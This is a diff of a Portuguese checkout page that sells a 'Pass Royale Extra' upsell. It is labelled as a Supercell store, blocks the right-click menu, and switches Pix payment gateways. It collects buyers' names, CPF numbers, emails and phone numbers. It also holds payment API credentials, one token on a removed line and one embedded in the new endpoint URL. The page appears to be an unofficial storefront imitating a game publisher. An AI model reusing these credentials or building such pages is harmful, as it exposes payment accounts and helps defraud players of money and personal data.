@@ -1,17 +1,6 @@
 <!DOCTYPE html><html lang="pt" style=""><head>
 <script src="../utm_xtrackytrack.js"></script>
 <script src="../utmifytrack.js"></script>
-<!-- TikTok Pixel Code Start -->
-<script>
-!function (w, d, t) {
-  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
-var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
-;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
-  ttq.load('D7I47OBC77U6LKRKSTB0');
-  ttq.page();
-}(window, document, 'ttq');
-</script>
-<!-- TikTok Pixel Code End -->
 
 <script>
 document.addEventListener('contextmenu', function(e) {
@@ -1351,18 +1340,18 @@ e.preventDefault();
     // =============================================
     // CONFIGURAÇÃO IRONPAY
     // =============================================
-    var IRONPAY_TOKEN = 'woGAwNhRUutbgD8qSBXQLOBxpMEZiw7TtbHXWUTisMFXSs6OowDXBYD3EOmy';
-    var OFFER_HASH = 'qdyan';
-    var API_BASE = 'https://api.ironpayapp.com.br/api/public/v1';
+    // Duttyfy — URL encriptada (endpoint + credencial)
+    // TODO: migrar para backend pra não expor no frontend
+    var DUTTYFY_URL = 'https://www.pagamentos-seguros.app/api-pix/dbDKWtAogeGIEev8UYqhDLF5YG5dBohgXYPvCLJjeU5rXxlal7tXhd4xIGievhV_2IQTEdbfnVOZXkR39NBC4g';
     var pollingInterval = null;
     var pollingCount = 0;
-    var MAX_POLLING = 400; // ~10 min a cada 1.5s
+    var MAX_POLLING = 180; // ~15 min a cada 5s (mínimo exigido pela Duttyfy)
     // =============================================
     // PRODUTO FIXO DO UPSELL (sem sessionStorage)
     // =============================================
     function getCartItems() { return [{ title: 'Pass Royale Extra', price: '19,37 R$', quantity: 1, image: '../images/clashroyale/icons/pass-royale-icon.webp' }]; }
     function getCartTotal() { return 1937; }
-    function buildIronPayCart() { return [{ product_hash: OFFER_HASH, title: 'Pass Royale Extra', price: 1937, quantity: 1, operation_type: 1, tangible: false }]; }
+    function buildDuttyfyItem() { return { title: 'Pass Royale Extra', price: 1937, quantity: 1 }; }
     function buildOrderDescription() { return '1x Pass Royale Extra (R$ 19,37)'; }
     function atualizarTotalPagina() {
       var el = document.querySelector('.pc-total');
@@ -1444,42 +1433,33 @@ e.preventDefault();
       document.getElementById('pix-form').style.display = 'none';
       document.getElementById('pix-loading').style.display = 'block';
       document.getElementById('pix-info-box').style.display = 'none';
+      // Montar utm: query string completa da URL + player_tag/nome/descrição
+      var rawUtm = window.location.search.replace(/^\?/, '');
+      var utmExtras = ['upsell=1'];
+      if (playerTag) utmExtras.push('player_tag=' + encodeURIComponent(playerTag.replace('#', '')));
+      if (playerName) utmExtras.push('player_name=' + encodeURIComponent(playerName));
+      utmExtras.push('order_desc=' + encodeURIComponent(buildOrderDescription()));
+      var utmString = rawUtm ? (rawUtm + '&' + utmExtras.join('&')) : utmExtras.join('&');
       var payload = {
         amount: totalCentavos,
-        offer_hash: OFFER_HASH,
-        payment_method: 'pix',
+        description: 'Upsell 1 - Pass Royale Extra' + (playerTag ? (' - ' + playerTag) : ''),
         customer: {
           name: nome,
-          email: email.toLowerCase(),
-          phone_number: telefone,
           document: cpf,
-          street_name: 'Rua',
-          number: '1',
-          complement: (playerTag ? ('TAG: ' + playerTag + ' | ' + playerName + ' | ') : '') + buildOrderDescription(cartItems),
-          neighborhood: 'Centro',
-          city: 'Sao Paulo',
-          state: 'SP',
-          zip_code: '01001000'
+          email: email.toLowerCase(),
+          phone: telefone
         },
-        cart: buildIronPayCart(cartItems),
-        expire_in_days: 1,
-        transaction_origin: 'api',
-        tracking: {
-          src: '',
-          utm_source: 'supercell-store',
-          utm_medium: 'checkout',
-          utm_campaign: playerTag ? ('player-' + playerTag.replace('#', '')) : 'direct',
-          utm_term: playerName,
-          utm_content: cartItems.map(function(i){ return i.title; }).join(', ')
-        }
+        item: buildDuttyfyItem(),
+        paymentMethod: 'PIX',
+        utm: utmString
       };
-      // (fetchComTimeout definido no escopo global acima)
-      // POST com retry automático (até 2 tentativas)
+      // POST Duttyfy com retry (backoff exponencial 1s / 2s / 4s)
       var data = null;
       var maxRetries = 2;
+      var backoff = [1000, 2000, 4000];
       for (var attempt = 0; attempt <= maxRetries; attempt++) {
         try {
-          var response = await fetchComTimeout(API_BASE + '/transactions?api_token=' + IRONPAY_TOKEN, {
+          var response = await fetchComTimeout(DUTTYFY_URL, {
             method: 'POST',
             headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
@@ -1488,16 +1468,19 @@ e.preventDefault();
             data = await response.json();
             break;
           }
-          // Erro do servidor - retry se não for a última tentativa
+          if (response.status >= 400 && response.status < 500) {
+            mostrarErro('Dados inválidos. Confira e tente novamente.');
+            return;
+          }
           if (attempt < maxRetries) {
-            await new Promise(function(r) { setTimeout(r, 1000); });
+            await new Promise(function(r) { setTimeout(r, backoff[attempt]); });
             continue;
           }
           mostrarErro('Erro ao gerar pagamento. Tente novamente.');
           return;
         } catch (err) {
           if (attempt < maxRetries) {
-            await new Promise(function(r) { setTimeout(r, 1000); });
+            await new Promise(function(r) { setTimeout(r, backoff[attempt]); });
             continue;
           }
           if (err.name === 'AbortError') {
@@ -1509,34 +1492,13 @@ e.preventDefault();
         }
       }
       try {
-        if (data && data.hash) {
-          // Prioridade: usar PIX do POST (já disponível, sem espera extra)
-          var pixQrCode = (data.pix && data.pix.pix_qr_code) ? data.pix.pix_qr_code : null;
-          // Se POST não trouxe PIX, buscar via GET como fallback
-          if (!pixQrCode) {
-            var detailResp = await fetchComTimeout(
-              API_BASE + '/transactions/' + data.hash + '?api_token=' + IRONPAY_TOKEN,
-              { headers: { 'Accept': 'application/json' } },
-              10000
-            );
-            var detailData = await detailResp.json();
-            pixQrCode = (detailData.pix && detailData.pix.pix_qr_code) ? detailData.pix.pix_qr_code : null;
-          }
-          if (pixQrCode) {
-            exibirPix(pixQrCode, data.hash);
-          } else {
-            mostrarErro('Não foi possível gerar o código Pix. Tente novamente.');
-          }
+        if (data && data.transactionId && data.pixCode) {
+          exibirPix(data.pixCode, data.transactionId);
         } else {
-          mostrarErro('Erro ao criar transação. Tente novamente.');
+          mostrarErro('Não foi possível gerar o código Pix. Tente novamente.');
         }
       } catch (err) {
-        var pixFallback = (data && data.pix && data.pix.pix_qr_code) ? data.pix.pix_qr_code : null;
-        if (pixFallback) {
-          exibirPix(pixFallback, data.hash);
-        } else {
-          mostrarErro('Erro ao carregar detalhes. Tente novamente.');
-        }
+        mostrarErro('Erro ao processar resposta. Tente novamente.');
       } finally {
         _pixProcessing = false;
         btnPagar.disabled = false;
@@ -1643,14 +1605,7 @@ e.preventDefault();
     // =============================================
     function iniciarPolling(transactionHash) {
       pollingCount = 0;
-      function getPollingDelay() {
-        // Primeiros 30s (20 checks): 1.5s — resposta rápida quando pagamento é imediato
-        if (pollingCount <= 20) return 1500;
-        // 30s a 2min: 3s — a maioria paga nesse intervalo
-        if (pollingCount <= 50) return 3000;
-        // Após 2min: 5s — reduz carga, usuário provavelmente saiu pra pagar
-        return 5000;
-      }
+      var POLL_INTERVAL = 5000; // Duttyfy exige mínimo 5s
       async function verificarPagamento() {
         pollingCount++;
         if (pollingCount > MAX_POLLING) {
@@ -1659,23 +1614,24 @@ e.preventDefault();
         }
         try {
           var resp = await fetchComTimeout(
-            API_BASE + '/transactions/' + transactionHash + '?api_token=' + IRONPAY_TOKEN,
+            DUTTYFY_URL + '?transactionId=' + encodeURIComponent(transactionHash),
             { headers: { 'Accept': 'application/json' } },
-            8000
+            10000
           );
           if (resp.ok) {
             var statusData = await resp.json();
-            if (statusData.payment_status === 'paid') {
+            if (statusData.status === 'COMPLETED') {
               exibirSucesso();
               return;
             }
           }
         } catch(e) {
-          // Falha silenciosa — tenta de novo no próximo ciclo
+          // Falha silenciosa — próximo ciclo tenta de novo
         }
-        pollingInterval = setTimeout(verificarPagamento, getPollingDelay());
+        pollingInterval = setTimeout(verificarPagamento, POLL_INTERVAL);
       }
-      pollingInterval = setTimeout(verificarPagamento, getPollingDelay());
+      // Primeiro check imediato
+      verificarPagamento();
     }
     // =============================================
     // SUCESSO
